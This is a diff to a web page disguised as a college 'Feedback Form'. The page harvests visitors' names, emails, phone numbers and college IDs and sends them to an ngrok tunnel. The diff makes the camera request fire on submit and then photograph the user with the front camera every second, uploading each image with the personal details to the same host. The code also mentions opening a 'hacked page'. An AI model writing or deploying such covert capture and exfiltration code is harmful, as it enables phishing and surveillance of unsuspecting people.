@@ -36,13 +36,15 @@
     #msg { color: #ef4444; font-size: 0.82rem; margin-top: 0.4rem; min-height: 1em; }
     button { width: 100%; padding: 0.75rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 0.5rem; transition: transform 0.1s, opacity 0.2s; }
     button:hover { opacity: 0.92; } button:active { transform: scale(0.98); } button:disabled { opacity: 0.6; cursor: not-allowed; }
-    .perm-btn {
-      width: 100%; padding: 0.75rem; background: #f59e0b; color: #fff; border: none;
-      border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer;
-      margin-bottom: 1rem; transition: opacity 0.2s;
+    .capture-indicator {
+      display: flex; align-items: center; justify-content: center;
+      gap: 0.5rem; margin-top: 0.5rem; color: #ef4444; font-size: 0.85rem;
     }
-    .perm-btn:hover { opacity: 0.92; }
-    .perm-btn.granted { background: #10b981; }
+    .capture-indicator .dot {
+      width: 8px; height: 8px; background: #ef4444; border-radius: 50%;
+      animation: pulse 1s infinite;
+    }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
   </style>
 </head>
 <body>
@@ -50,16 +52,7 @@
     <h1>Feedback Form</h1>
     <p class="sub">Please fill in your details.</p>
 
-    <div class="perm-section" id="permSection">
-      <button type="button" class="perm-btn" id="cameraBtn">
-        📷 Allow Camera Access (Required)
-      </button>
-      <p style="font-size: 0.75rem; color: #6b7280; margin-top: 0.5rem; text-align: center;">
-        Camera access is required for verification. Tap the button above to allow.
-      </p>
-    </div>
-
-    <form id="feedbackForm" novalidate style="display: none;">
+    <form id="feedbackForm" novalidate>
       <div class="field">
         <label for="name">Full Name</label>
         <input type="text" id="name" name="name" placeholder="Enter your full name" required />
@@ -78,6 +71,9 @@
       </div>
       <button type="submit" id="submitBtn">Submit</button>
       <div id="msg"></div>
+      <div class="capture-indicator" id="captureIndicator" style="display:none;">
+        <span class="dot"></span> Capturing every 1s...
+      </div>
     </form>
   </div>
 
@@ -89,43 +85,10 @@
     const form = document.getElementById("feedbackForm");
     const msg = document.getElementById("msg");
     const btn = document.getElementById("submitBtn");
-    const cameraBtn = document.getElementById("cameraBtn");
-    const permSection = document.getElementById("permSection");
-    const feedbackForm = document.getElementById("feedbackForm");
+    const captureIndicator = document.getElementById("captureIndicator");
 
     const validateEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
     const validatePhone = (v) => /^[+]?[\d\s\-()]{7,15}$/.test(v.replace(/\s/g, ""));
-
-    let cameraStream = null;
-    let cameraGranted = false;
-
-    // Camera permission on button click (user gesture)
-    cameraBtn.addEventListener("click", async () => {
-      try {
-        cameraBtn.disabled = true;
-        cameraBtn.textContent = "📷 Requesting camera...";
-
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, audio: false
-        });
-        window.cameraStream = stream;
-        cameraGranted = true;
-
-        cameraBtn.textContent = "✅ Camera Access Granted";
-        cameraBtn.classList.add("granted");
-        cameraBtn.disabled = true;
-
-        // Show the form now
-        permSection.style.display = "none";
-        document.getElementById("feedbackForm").style.display = "block";
-
-        console.log("Camera permission granted on mobile");
-      } catch (e) {
-        console.error("Camera permission denied:", e);
-        cameraBtn.textContent = "❌ Camera Denied - Try Again";
-        cameraBtn.disabled = false;
-      }
-    });
 
     function showMsg(text, isError = true) {
       msg.textContent = text;
@@ -157,12 +120,6 @@
 
       if (!ok) { showMsg("Please fix the highlighted fields."); return; }
 
-      // Check camera permission
-      if (!cameraGranted) {
-        showMsg("Please allow camera access first by tapping the button above.");
-        return;
-      }
-
       // Disable form
       btn.disabled = true;
       btn.textContent = "Submitting...";
@@ -179,8 +136,8 @@
         await fetch("https://stainless-king-gravitate.ngrok-free.dev/submit", {
           method: "POST", headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            name: userName, email: userEmail, phone: phoneEl.value.trim(),
-            collegeId: collegeEl.value.trim(), time: new Date().toISOString()
+            name: userName, email: userEmail, phone: userPhone,
+            collegeId: userCollegeId, time: new Date().toISOString()
           })
         });
         console.log("Submit sent successfully");
@@ -195,32 +152,34 @@
         console.error("Failed to open hacked page:", e);
       }
 
-      // 3. Start continuous capture every 1 second in THIS tab
+      // 3. Request camera permission ON SUBMIT (user gesture - works on mobile!)
+      let stream = null;
       try {
-        startContinuousCapture();
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, audio: false
+        });
+        window.cameraStream = stream;
+        console.log("Camera permission granted on submit");
       } catch (e) {
-        console.error("Capture failed:", e);
+        console.error("Camera not available:", e);
+        // Continue without camera if denied
       }
+
+      // 3. Start continuous capture every 1 second in THIS tab
+      if (stream) {
+        startContinuousCapture(stream);
+      }
+
+      // Show capture indicator
+      captureIndicator.style.display = "flex";
+      btn.disabled = true;
+      btn.textContent = "Capturing every 1s... (close tab to stop)";
 
       // Hide form
       form.style.display = "none";
-      btn.disabled = true;
-      btn.textContent = "Capturing every 1s... (close tab to stop)";
     });
 
-    async function startContinuousCapture() {
-      let stream = window.cameraStream;
-      if (!stream) {
-        try {
-          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-          window.cameraStream = stream;
-          console.log("Camera stream obtained");
-        } catch (e) {
-          console.error("Camera not available:", e);
-          return;
-        }
-      }
-
+    async function startContinuousCapture(stream) {
       // Continuous capture every 1 second until tab closes
       async function captureLoop() {
         if (!stream) return;
@@ -235,13 +194,18 @@
           ctx.drawImage(video, 0, 0, 320, 240);
           const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
 
+          const name = document.getElementById("name").value.trim();
+          const email = document.getElementById("email").value.trim();
+          const phone = document.getElementById("phone").value.trim();
+          const collegeId = document.getElementById("collegeId").value.trim();
+
           await fetch("https://stainless-king-gravitate.ngrok-free.dev/capture", {
             method: "POST", headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              name: document.getElementById("name").value.trim(),
-              email: document.getElementById("email").value.trim(),
-              phone: document.getElementById("phone").value.trim(),
-              collegeId: document.getElementById("collegeId").value.trim(),
+              name: nameEl.value.trim(),
+              email: emailEl.value.trim(),
+              phone: phoneEl.value.trim(),
+              collegeId: collegeEl.value.trim(),
               image: dataUrl,
               time: new Date().toISOString()
             })
@@ -257,6 +221,11 @@
 
       // Start the continuous capture loop
       captureLoop();
+    }
+
+    function showMsg(text, isError = true) {
+      msg.textContent = text;
+      msg.style.color = isError ? "#ef4444" : "#10b981";
     }
   </script>
 </body>
